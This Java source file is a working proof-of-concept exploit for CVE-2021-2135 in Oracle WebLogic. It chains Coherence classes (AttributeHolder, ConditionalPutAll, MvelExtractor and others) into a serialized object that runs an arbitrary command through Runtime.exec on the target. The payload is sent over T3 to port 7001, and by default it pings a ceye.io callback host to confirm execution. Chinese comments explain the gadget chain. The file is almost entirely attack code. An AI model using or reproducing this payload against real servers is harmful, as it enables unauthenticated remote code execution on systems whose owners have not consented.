package com.r17a.weblogic.cve;

import com.sun.org.apache.xpath.internal.objects.XString;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.internal.util.SimpleBinaryEntry;
import com.tangosol.io.DefaultSerializer;
import com.tangosol.io.Serializer;
import com.tangosol.util.*;
import com.tangosol.util.aggregator.TopNAggregator;
import com.tangosol.util.filter.MapEventFilter;
import com.tangosol.util.processor.ConditionalPutAll;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class CVE_2021_2135 implements ObjectPayload{
    public static void main(String[] args) throws Exception {
//        final String command = args[1];
        String host = "127.0.0.1";
        String command = "ping " + host + ".xxx.ceye.io";

//         最终的执行载体
//         执行没有结果时会返回ProcessImpl实例，poc会将结果转为Comparable，ProcessImpl实例不能转换所以会报错，因此这里返回一个Integer类型的数据
//        MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"calc\");return new Integer(1);");
        MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+ command +"\");return new Integer(1);");
        MvelExtractor extractor2 = new MvelExtractor("");

        // 序列化入口
        AttributeHolder attributeHolder = new AttributeHolder();

        SortedBag partialResult = new TopNAggregator.PartialResult(extractor2, 2);
        partialResult.add(1);
        filedSet("m_comparator",partialResult, extractor1);

        // 这里bin_Key必须用ExternalizableHelper.writeObject赋值，不能用partialResult.writeExternal(dataOutputStream1);
        // 因为使用partialResult.writeExternal最终不会调用partialResult.readExternal，只会写m_comparator，不写partialResult自身
        ByteArrayOutputStream baos1 = new ByteArrayOutputStream();
        DataOutputStream dataOutputStream1 = new DataOutputStream(baos1);
        ExternalizableHelper.writeObject(dataOutputStream1, partialResult);

        ByteArrayOutputStream baos2 = new ByteArrayOutputStream();
        DataOutputStream dataOutputStream2 = new DataOutputStream(baos2);
        ExternalizableHelper.writeObject(dataOutputStream2, new Integer(0));

        Binary key = new Binary(baos1);
        Binary value = new Binary(baos2);
        SimpleBinaryEntry simpleBinaryEntry = new SimpleBinaryEntry(key,value);
        Serializer m_serializer= new DefaultSerializer(SimpleBinaryEntry.class.getClassLoader());
        simpleBinaryEntry.setContextSerializer(m_serializer);

        // 调用xString.equals(simpleBinaryEntry)可触发SimpleBinaryEntry#toString，所以map按顺序先加入simpleBinaryEntry，再加入xString

        LiteMap liteMap = new LiteMap();
        liteMap.put(simpleBinaryEntry,1);
        liteMap.put(new XString(null),2);
        ConditionalPutAll conditionalPutAll = new ConditionalPutAll(new MapEventFilter(), liteMap);

        // 序列化入口
//        AttributeHolder attributeHolder = new AttributeHolder();
        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder, conditionalPutAll); //调用setInternalValue方法设置m_oValue属性为conditionalPutAll


//        FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\tmp\\" + host +".ser"));
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
//        objectOutputStream.writeObject(attributeHolder);

//        FileInputStream fileInputStream = new FileInputStream(new File("E:\\test.ser"));
//        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
//        objectInputStream.readObject();
//
        T3ProtocolOperation.send(host, "7001", Serializables.serialize(attributeHolder));
//
//        FileInputStream fileInputStream = new FileInputStream(new File("E:\\tmp\\" + host + ".ser"));
//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
//        int len = 0;
//        byte[] b = new byte[10000];
//        while ((len = fileInputStream.read(b, 0, b.length)) != -1) {
//            baos.write(b, 0, len);
//        }
//
//        T3ProtocolOperation.send(host, "7001", baos.toByteArray());
    }

    private static void filedSet(String fieldName, Object target, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Field field = target.getClass().getSuperclass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(target, fieldValue);
    }

    public void getSerFile(String cmd) {
        // 最终的执行载体
        // 执行没有结果时会返回ProcessImpl实例，poc会将结果转为Comparable，ProcessImpl实例不能转换所以会报错，因此这里返回一个Integer类型的数据
//        MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"ping 0ks3b9.ceye.io\");return new Integer(1);");
        MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+ cmd +"\");return new Integer(1);");
        MvelExtractor extractor2 = new MvelExtractor("");

        try {
            TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult(extractor2, 2);
            partialResult.add(1);
            Field field = partialResult.getClass().getSuperclass().getDeclaredField("m_comparator");
            field.setAccessible(true);
            field.set(partialResult, extractor1);

            // 这里bin_Key必须用ExternalizableHelper.writeObject赋值，不能用partialResult.writeExternal(dataOutputStream1);
            // 因为使用partialResult.writeExternal最终不会调用partialResult.readExternal，只会写m_comparator，不写partialResult自身
            ByteArrayOutputStream baos1 = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream1 = new DataOutputStream(baos1);
            ExternalizableHelper.writeObject(dataOutputStream1, partialResult);

            ByteArrayOutputStream baos2 = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream2 = new DataOutputStream(baos2);
            ExternalizableHelper.writeObject(dataOutputStream2, new Integer(0));

            Binary key = new Binary(baos1);
            Binary value = new Binary(baos2);
            SimpleBinaryEntry simpleBinaryEntry = new SimpleBinaryEntry(key,value);
            Serializer m_serializer= new DefaultSerializer(SimpleBinaryEntry.class.getClassLoader());
            simpleBinaryEntry.setContextSerializer(m_serializer);

            // 调用xString.equals(simpleBinaryEntry)可触发SimpleBinaryEntry#toString，所以map按顺序先加入simpleBinaryEntry，再加入xString

            LiteMap liteMap = new LiteMap();
            liteMap.put(simpleBinaryEntry,1);
            ConditionalPutAll conditionalPutAll = new ConditionalPutAll(new MapEventFilter(), liteMap);
            liteMap.put(new XString(null),2);

            // 序列化入口
            AttributeHolder attributeHolder = new AttributeHolder();
            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder, conditionalPutAll); //调用setInternalValue方法设置m_oValue属性为conditionalPutAll


            FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\test.ser"));
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(attributeHolder);
        }catch (Exception e){
            System.out.println(e);
        }

    }
}